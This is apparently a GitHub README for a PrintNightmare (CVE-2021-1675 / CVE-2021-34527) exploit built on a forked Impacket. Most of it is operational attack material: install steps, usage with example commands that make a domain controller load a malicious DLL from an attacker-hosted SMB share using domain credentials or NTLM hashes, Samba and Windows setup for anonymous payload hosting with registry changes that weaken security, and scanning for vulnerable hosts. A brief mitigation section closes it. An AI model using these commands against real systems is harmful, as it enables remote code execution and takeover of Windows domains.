# CVE-2021-1675 / CVE-2021-34527

Impacket implementation of the [PrintNightmare ](https://github.com/afwu/PrintNightmare) PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)

Tested on a fully patched 2019 Domain Controller

Execute malicious DLL's remote or locally

![](Images/poc2.png)

### Patch update
Microsoft has released a patch to mitigate against these attacks but if these values below are present on a machine, then the machine will still be vulnerable
```
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1
```

### Installation

Before running the exploit you need to install my version of Impacket and after that you're gucci

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### CVE-2021-1675.py

```
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

From windows it's also possible

```
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot
```

### Scanning

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable 

```bash
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

### Mitigation

Disable Spooler service

```powershell
Stop-Service Spooler
REG ADD  "HKLM\SYSTEM\CurrentControlSet\Services\Spooler"  /v "Start" /t REG_DWORD /d "4" /f
```



